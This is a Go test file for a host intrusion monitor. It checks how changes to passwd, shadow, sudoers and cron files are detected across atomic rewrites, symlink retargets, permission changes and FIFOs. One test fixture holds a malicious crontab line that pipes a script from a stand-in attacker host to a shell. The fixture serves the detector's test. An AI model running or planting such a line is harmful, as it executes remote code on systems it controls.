package checks

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"golang.org/x/sys/unix"
)

// sensitiveDiffFixture writes a real file under a temp root and returns its
// path. The watchset evaluators read the file back, so the path has to exist.
// Names must be ones classifySensitive recognises, otherwise the evaluators
// bail out early and the test passes without exercising the diff.
func sensitiveDiffFixture(t *testing.T, name, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	if classifySensitive(path) == "" {
		t.Fatalf("fixture %s is not a recognised sensitive path; the test would pass vacuously", path)
	}
	return path
}

// sensitiveCronFixture writes a cron drop-in under a directory classifySensitive
// recognises as cron, so glob-style watchset entries can be exercised.
func sensitiveCronFixture(t *testing.T, dir, name string) string {
	t.Helper()
	cronDir := filepath.Join(dir, "cron.d")
	if err := os.MkdirAll(cronDir, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(cronDir, name)
	if err := os.WriteFile(path, []byte("* * * * * root /bin/true\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if classifySensitive(path) != "cron" {
		t.Fatalf("fixture %s did not classify as cron", path)
	}
	return path
}

func findingFor(t *testing.T, findings []alert.Finding, path string) alert.Finding {
	t.Helper()
	for _, f := range findings {
		if f.FilePath == path {
			return f
		}
	}
	t.Fatalf("no finding for %s in %+v", path, findings)
	return alert.Finding{}
}

func sensitiveStates(digests map[string]string) map[string]SensitiveFileState {
	states := make(map[string]SensitiveFileState, len(digests))
	for path, digest := range digests {
		states[path] = sensitiveState(digest)
	}
	return states
}

func sensitiveState(digest string) SensitiveFileState {
	return SensitiveFileState{ContentDigest: digest, PathIdentity: sensitiveRegularPathIdentityPrefix}
}

type sensitiveTestFileInfo struct {
	name string
	mode os.FileMode
}

func (f sensitiveTestFileInfo) Name() string       { return f.name }
func (f sensitiveTestFileInfo) Size() int64        { return 0 }
func (f sensitiveTestFileInfo) Mode() os.FileMode  { return f.mode }
func (f sensitiveTestFileInfo) ModTime() time.Time { return time.Time{} }
func (f sensitiveTestFileInfo) IsDir() bool        { return f.mode.IsDir() }
func (f sensitiveTestFileInfo) Sys() any           { return nil }

func sensitiveRegularMock(readFile func(string) ([]byte, error)) *mockOS {
	return &mockOS{
		readRegularFile: readFile,
		lstat: func(name string) (os.FileInfo, error) {
			return sensitiveTestFileInfo{name: filepath.Base(name), mode: 0o600}, nil
		},
	}
}

// A path the previous refresh had never seen is genuinely new, so the
// watcher must still report it. Deleting the appearance branch would make
// this fail.
func TestDiffSensitiveWatchsetReportsGenuinelyNewPath(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "passwd", "root:x:0:0::/root:/bin/bash\n")

	got := DiffSensitiveWatchset(nil, sensitiveStates(map[string]string{path: "hash-a"}), nil, nil)

	if len(got) != 1 {
		t.Fatalf("want 1 finding, got %d: %+v", len(got), got)
	}
	if !strings.Contains(got[0].Message, "New sensitive system file appeared") {
		t.Errorf("new path should report an appearance, got %q", got[0].Message)
	}
}

// The production bug: cPanel rewrites /etc/passwd by writing a temp file and
// renaming it over the target, which changes the inode. The watcher keyed its
// known-set on dev+inode, so every rewrite looked like a brand-new file and
// /etc/passwd was reported as having "appeared" 16 times in 30 days.
func TestDiffSensitiveWatchsetDoesNotReportRewriteAsNewFile(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "passwd", "root:x:0:0::/root:/bin/bash\nnew:x:1:1::/home/new:/bin/bash\n")

	got := DiffSensitiveWatchset(
		sensitiveStates(map[string]string{path: "hash-before"}),
		sensitiveStates(map[string]string{path: "hash-after"}),
		nil,
		nil,
	)

	for _, f := range got {
		if strings.Contains(f.Message, "appeared") {
			t.Errorf("a path known to the previous refresh must not be reported as new, got %q", f.Message)
		}
	}
}

// A rewrite that changes content is a modification of a watched file. The BPF
// write hook cannot see it (the write landed on the temp inode), so the
// refresh diff is the only detector that can report it.
func TestDiffSensitiveWatchsetReportsContentChange(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "shadow", "root:!!:20000:0:99999:7:::\n")

	got := DiffSensitiveWatchset(
		sensitiveStates(map[string]string{path: "hash-before"}),
		sensitiveStates(map[string]string{path: "hash-after"}),
		nil,
		nil,
	)

	if len(got) != 1 {
		t.Fatalf("want 1 finding, got %d: %+v", len(got), got)
	}
	f := findingFor(t, got, path)
	if !strings.Contains(f.Message, "Content changed on sensitive system file") {
		t.Errorf("changed content should report a content change, got %q", f.Message)
	}
	if f.Check != "sensitive_file_modified" {
		t.Errorf("check = %q, want sensitive_file_modified", f.Check)
	}
	if f.Severity != alert.High {
		t.Errorf("severity = %v, want HIGH", f.Severity)
	}
}

// An atomic rewrite that leaves content byte-identical is a no-op. Reporting
// it would reintroduce the noise this fix removes.
func TestDiffSensitiveWatchsetIgnoresRewriteWithIdenticalContent(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "group", "root:x:0:\n")

	got := DiffSensitiveWatchset(
		sensitiveStates(map[string]string{path: "same-hash"}),
		sensitiveStates(map[string]string{path: "same-hash"}),
		nil,
		nil,
	)

	if len(got) != 0 {
		t.Errorf("identical content must not produce a finding, got %+v", got)
	}
}

func TestNextSensitiveDigestsIgnoresRegularInodeReplacementWithIdenticalContent(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	old := osFS
	osFS = realOS{}
	t.Cleanup(func() { osFS = old })

	path := sensitiveCronFixture(t, t.TempDir(), "job")
	prev, _ := NextSensitiveDigests(nil, []string{path})
	replacement := filepath.Join(filepath.Dir(path), "replacement")
	if err := os.WriteFile(replacement, []byte("* * * * * root /bin/true\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(replacement, path); err != nil {
		t.Fatal(err)
	}
	cur, contents := NextSensitiveDigests(prev, []string{path})

	if prev[path] != cur[path] {
		t.Fatalf("byte-identical regular replacement changed state: before=%+v after=%+v", prev[path], cur[path])
	}
	if got := DiffSensitiveWatchset(prev, cur, contents, nil); len(got) != 0 {
		t.Fatalf("byte-identical regular replacement must stay quiet, got %+v", got)
	}
}

func TestDiffSensitiveWatchsetReportsPermissionChangeWithIdenticalContent(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	old := osFS
	osFS = realOS{}
	t.Cleanup(func() { osFS = old })

	path := sensitiveCronFixture(t, t.TempDir(), "job")
	prev, _ := NextSensitiveDigests(nil, []string{path})
	if err := os.Chmod(path, 0o644); err != nil {
		t.Fatal(err)
	}
	cur, contents := NextSensitiveDigests(prev, []string{path})

	if prev[path].ContentDigest != cur[path].ContentDigest {
		t.Fatal("permission-only change unexpectedly changed the content digest")
	}
	got := DiffSensitiveWatchset(prev, cur, contents, nil)
	if len(got) != 1 {
		t.Fatalf("permission change must emit one finding, got %+v", got)
	}
	if !strings.Contains(got[0].Message, "Path identity changed") {
		t.Errorf("permission change message = %q, want path identity change", got[0].Message)
	}
}

// A symlink is part of the watchset path's identity. Retargeting it can move a
// trusted cron or sudoers entry to attacker-controlled storage even when both
// targets currently contain the same bytes, so content equality is not enough
// to call the replacement a no-op.
func TestDiffSensitiveWatchsetReportsSymlinkRetargetWithIdenticalContent(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	old := osFS
	osFS = realOS{}
	t.Cleanup(func() { osFS = old })

	root := t.TempDir()
	cronDir := filepath.Join(root, "cron.d")
	if err := os.MkdirAll(cronDir, 0o755); err != nil {
		t.Fatal(err)
	}
	first := filepath.Join(root, "first")
	second := filepath.Join(root, "second")
	for _, path := range []string{first, second} {
		if err := os.WriteFile(path, []byte("0 * * * * root /bin/true\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	link := filepath.Join(cronDir, "job")
	if err := os.Symlink(first, link); err != nil {
		t.Fatal(err)
	}
	prev, _ := NextSensitiveDigests(nil, []string{link})

	if err := os.Remove(link); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(second, link); err != nil {
		t.Fatal(err)
	}
	cur, contents := NextSensitiveDigests(prev, []string{link})

	got := DiffSensitiveWatchset(prev, cur, contents, nil)
	if len(got) != 1 {
		t.Fatalf("symlink retarget must emit one finding, got %+v", got)
	}
	if got[0].FilePath != link {
		t.Errorf("finding path = %q, want %q", got[0].FilePath, link)
	}
	if !strings.Contains(got[0].Message, "Path identity changed") {
		t.Errorf("symlink retarget message = %q, want path identity change", got[0].Message)
	}
}

// A path that disappears is handled by unwatching its inode, not by an alert;
// the diff must not invent a finding for it.
func TestDiffSensitiveWatchsetIgnoresRemovedPath(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveCronFixture(t, t.TempDir(), "dropin")

	got := DiffSensitiveWatchset(sensitiveStates(map[string]string{path: "hash-a"}), nil, nil, nil)

	if len(got) != 0 {
		t.Errorf("removed path must not produce a finding, got %+v", got)
	}
}

// A path whose hash could not be computed this cycle carries no evidence of
// change. Treating the empty digest as a real value would emit a finding on
// every transient read error.
func TestDiffSensitiveWatchsetIgnoresUnknownDigest(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "sudoers", "root ALL=(ALL) ALL\n")

	got := DiffSensitiveWatchset(
		sensitiveStates(map[string]string{path: "hash-a"}),
		sensitiveStates(map[string]string{path: ""}),
		nil,
		nil,
	)

	if len(got) != 0 {
		t.Errorf("unknown digest must not produce a finding, got %+v", got)
	}
}

// The live write hook already reported this path with process attribution, so
// the refresh must absorb the new digest silently instead of describing the
// same write a second time with less detail.
func TestDiffSensitiveWatchsetSkipsPathsTheWriteHookAlreadyReported(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "sudoers", "root ALL=(ALL) ALL\n")

	prev := sensitiveStates(map[string]string{path: "hash-before"})
	cur := sensitiveStates(map[string]string{path: "hash-after"})
	got := DiffSensitiveWatchset(prev, cur, nil, map[string]SensitiveFileState{path: cur[path]})

	if len(got) != 0 {
		t.Errorf("write already reported live; refresh must stay quiet, got %+v", got)
	}
}

// A live finding only covers the state captured for that finding. A later
// rename-over on the same path has no BPF event and must not inherit the earlier
// write's suppression merely because both happened in one refresh interval.
func TestDiffSensitiveWatchsetDoesNotSuppressStateAfterLiveReport(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveDiffFixture(t, "sudoers", "root ALL=(ALL) ALL\n")
	prev := sensitiveStates(map[string]string{path: "hash-before"})
	cur := sensitiveStates(map[string]string{path: "hash-after-rename"})
	reported := sensitiveStates(map[string]string{path: "hash-after-live-write"})

	got := DiffSensitiveWatchset(prev, cur, nil, reported)

	if len(got) != 1 {
		t.Fatalf("later unreported state must emit one finding, got %+v", got)
	}
}

// The bytes used for suppression must be the same bytes whose digest changed.
// Re-reading after the digest pass lets a concurrent rewrite replace attacker
// content with a suppressible managed crontab and erase all evidence of the
// intervening change.
func TestDiffSensitiveWatchsetEvaluatesHashedContent(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	malicious := []byte("* * * * * curl http://evil.invalid/p | sh\n")
	managed := realCSMCrontab("alice", "/home/alice/public_html")
	reads := 0
	old := osFS
	osFS = sensitiveRegularMock(func(string) ([]byte, error) {
		reads++
		if reads == 1 {
			return malicious, nil
		}
		return managed, nil
	})
	t.Cleanup(func() { osFS = old })

	prev := sensitiveStates(map[string]string{path: "hash-before"})
	cur, contents := NextSensitiveDigests(prev, []string{path})
	got := DiffSensitiveWatchset(
		prev,
		cur,
		contents,
		nil,
	)

	if len(got) != 1 {
		t.Fatalf("changed attacker content must emit one finding, got %+v", got)
	}
	if reads != 1 {
		t.Fatalf("diff re-read content %d times; want the hashed snapshot read once", reads)
	}
}

// Suppression is scoped to the written path: an unrelated file changing in the
// same cycle must still be reported.
func TestDiffSensitiveWatchsetStillReportsOtherPathsWhenOneWasReported(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	reported := sensitiveDiffFixture(t, "sudoers", "root ALL=(ALL) ALL\n")
	other := sensitiveDiffFixture(t, "shadow", "root:!!:20000:0:99999:7:::\n")

	got := DiffSensitiveWatchset(
		sensitiveStates(map[string]string{reported: "a", other: "a"}),
		sensitiveStates(map[string]string{reported: "b", other: "b"}),
		nil,
		map[string]SensitiveFileState{reported: sensitiveState("b")},
	)

	if len(got) != 1 {
		t.Fatalf("want 1 finding, got %d: %+v", len(got), got)
	}
	if got[0].FilePath != other {
		t.Errorf("finding path = %q, want %q", got[0].FilePath, other)
	}
}

// A genuinely new path is reported even if the write hook fired for it: the
// hook reports the write, the diff reports that the path did not exist before.
func TestDiffSensitiveWatchsetStillReportsNewPathWhenWriteHookFired(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	path := sensitiveCronFixture(t, t.TempDir(), "newjob")

	got := DiffSensitiveWatchset(
		nil,
		sensitiveStates(map[string]string{path: "hash"}),
		nil,
		sensitiveStates(map[string]string{path: "hash"}),
	)

	if len(got) != 1 {
		t.Fatalf("want 1 appearance finding, got %d: %+v", len(got), got)
	}
	if !strings.Contains(got[0].Message, "New sensitive system file appeared") {
		t.Errorf("got %q, want an appearance finding", got[0].Message)
	}
}

func TestNextSensitiveDigestsDistinguishesContent(t *testing.T) {
	old := osFS
	osFS = sensitiveRegularMock(func(name string) ([]byte, error) {
		return []byte("content-of-" + name), nil
	})
	t.Cleanup(func() { osFS = old })

	got, _ := NextSensitiveDigests(nil, []string{"/etc/passwd", "/etc/group"})

	if got["/etc/passwd"].ContentDigest == "" || got["/etc/group"].ContentDigest == "" {
		t.Fatalf("readable paths must get a digest, got %+v", got)
	}
	if got["/etc/passwd"].ContentDigest == got["/etc/group"].ContentDigest {
		t.Errorf("different content must hash differently, both = %q", got["/etc/passwd"].ContentDigest)
	}
}

// A file that exists but cannot be read this cycle carries no evidence. Storing
// an empty digest would make the next successful read look like a change.
func TestNextSensitiveDigestsCarriesForwardWhenReadFails(t *testing.T) {
	old := osFS
	osFS = sensitiveRegularMock(func(string) ([]byte, error) { return nil, os.ErrPermission })
	t.Cleanup(func() { osFS = old })

	got, _ := NextSensitiveDigests(sensitiveStates(map[string]string{"/etc/shadow": "known-digest"}), []string{"/etc/shadow"})

	if got["/etc/shadow"].ContentDigest != "known-digest" {
		t.Errorf("digest = %q, want the previous digest carried forward", got["/etc/shadow"].ContentDigest)
	}
}

func TestNextSensitiveDigestsDoesNotMutatePreviousSnapshot(t *testing.T) {
	old := osFS
	osFS = sensitiveRegularMock(func(string) ([]byte, error) { return []byte("new content"), nil })
	t.Cleanup(func() { osFS = old })
	path := "/etc/shadow"
	prev := sensitiveStates(map[string]string{path: "known-digest"})
	wantPrev := prev[path]

	next, _ := NextSensitiveDigests(prev, []string{path})

	if prev[path] != wantPrev {
		t.Fatalf("previous snapshot mutated: got %+v, want %+v", prev[path], wantPrev)
	}
	if next[path].ContentDigest == wantPrev.ContentDigest {
		t.Fatal("test did not establish a distinct next digest")
	}
}

func TestNextSensitiveDigestsLeavesDigestUnknownWithoutPrior(t *testing.T) {
	old := osFS
	osFS = sensitiveRegularMock(func(string) ([]byte, error) { return nil, os.ErrPermission })
	t.Cleanup(func() { osFS = old })

	got, _ := NextSensitiveDigests(nil, []string{"/etc/shadow"})

	if _, ok := got["/etc/shadow"]; !ok {
		t.Fatal("path must stay in the snapshot so it is not re-reported as new")
	}
	if got["/etc/shadow"].ContentDigest != "" {
		t.Errorf("digest = %q, want empty so the diff treats it as unknown", got["/etc/shadow"].ContentDigest)
	}
}

// A path that no longer exists is not passed in, so it must drop out of the
// snapshot rather than linger from the previous cycle.
func TestNextSensitiveDigestsDropsPathsNotSupplied(t *testing.T) {
	old := osFS
	osFS = sensitiveRegularMock(func(string) ([]byte, error) { return []byte("x"), nil })
	t.Cleanup(func() { osFS = old })

	got, _ := NextSensitiveDigests(sensitiveStates(map[string]string{"/etc/cron.d/gone": "d"}), []string{"/etc/passwd"})

	if _, ok := got["/etc/cron.d/gone"]; ok {
		t.Error("a path absent from this refresh must not survive in the snapshot")
	}
}

func TestNextSensitiveDigestsDoesNotReadNonRegularPath(t *testing.T) {
	old := osFS
	read := false
	osFS = &mockOS{
		lstat: func(name string) (os.FileInfo, error) {
			return sensitiveTestFileInfo{name: filepath.Base(name), mode: os.ModeNamedPipe | 0o600}, nil
		},
		readRegularFile: func(string) ([]byte, error) {
			read = true
			return nil, nil
		},
	}
	t.Cleanup(func() { osFS = old })
	path := "/etc/cron.d/pipe"
	prev := sensitiveStates(map[string]string{path: "known-digest"})

	got, contents := NextSensitiveDigests(prev, []string{path})

	if read {
		t.Fatal("digest snapshot attempted to read a non-regular path")
	}
	if _, ok := contents[path]; ok {
		t.Fatal("non-regular path must not have captured content")
	}
	if got[path].ContentDigest != "known-digest" {
		t.Errorf("digest = %q, want prior digest carried forward", got[path].ContentDigest)
	}
	if got[path].PathIdentity == prev[path].PathIdentity {
		t.Fatal("non-regular type change must remain visible in path identity")
	}
}

func TestReadRegularFileDoesNotBlockOnFIFO(t *testing.T) {
	path := filepath.Join(t.TempDir(), "pipe")
	if err := unix.Mkfifo(path, 0o600); err != nil {
		t.Fatal(err)
	}
	done := make(chan error, 1)
	go func() {
		_, err := (realOS{}).ReadRegularFile(path)
		done <- err
	}()

	select {
	case err := <-done:
		if !errors.Is(err, errNonRegularFile) {
			t.Fatalf("FIFO read error = %v, want %v", err, errNonRegularFile)
		}
	case <-time.After(time.Second):
		fd, _ := unix.Open(path, unix.O_WRONLY|unix.O_NONBLOCK, 0)
		if fd >= 0 {
			_ = unix.Close(fd)
		}
		t.Fatal("FIFO read blocked")
	}
}

func TestNextSensitiveDigestsTracksResolvedSymlinkType(t *testing.T) {
	old := osFS
	read := false
	osFS = &mockOS{
		lstat: func(name string) (os.FileInfo, error) {
			return sensitiveTestFileInfo{name: filepath.Base(name), mode: os.ModeSymlink | 0o777}, nil
		},
		readlink: func(string) (string, error) { return "target", nil },
		stat: func(string) (os.FileInfo, error) {
			return sensitiveTestFileInfo{name: "target", mode: os.ModeNamedPipe | 0o600}, nil
		},
		readRegularFile: func(string) ([]byte, error) {
			read = true
			return nil, nil
		},
	}
	t.Cleanup(func() { osFS = old })
	path := "/etc/cron.d/link"
	prev := map[string]SensitiveFileState{
		path: {
			ContentDigest: "known-digest",
			PathIdentity:  "symlink\x00target\x00" + sensitiveRegularPathIdentityPrefix,
		},
	}

	cur, contents := NextSensitiveDigests(prev, []string{path})

	if read {
		t.Fatal("digest snapshot attempted to read a symlink to a non-regular object")
	}
	if _, ok := contents[path]; ok {
		t.Fatal("symlink to a non-regular object must not have captured content")
	}
	if !sensitiveFileStateChanged(prev[path], cur[path]) {
		t.Fatalf("resolved target type change was lost: before=%+v after=%+v", prev[path], cur[path])
	}
}

// Findings drive an alert stream operators read top-to-bottom; map iteration
// order would otherwise shuffle them between refreshes.
func TestDiffSensitiveWatchsetReturnsPathOrderedFindings(t *testing.T) {
	disableSensitiveProvenanceForTest(t)
	dir := t.TempDir()
	var paths []string
	for _, name := range []string{"c-dropin", "a-dropin", "b-dropin"} {
		paths = append(paths, sensitiveCronFixture(t, dir, name))
	}
	cur := map[string]SensitiveFileState{}
	for _, p := range paths {
		cur[p] = sensitiveState("hash")
	}

	got := DiffSensitiveWatchset(nil, cur, nil, nil)

	if len(got) != 3 {
		t.Fatalf("want 3 findings, got %d", len(got))
	}
	for i := 1; i < len(got); i++ {
		if got[i-1].FilePath > got[i].FilePath {
			t.Errorf("findings not ordered by path: %q before %q", got[i-1].FilePath, got[i].FilePath)
		}
	}
}
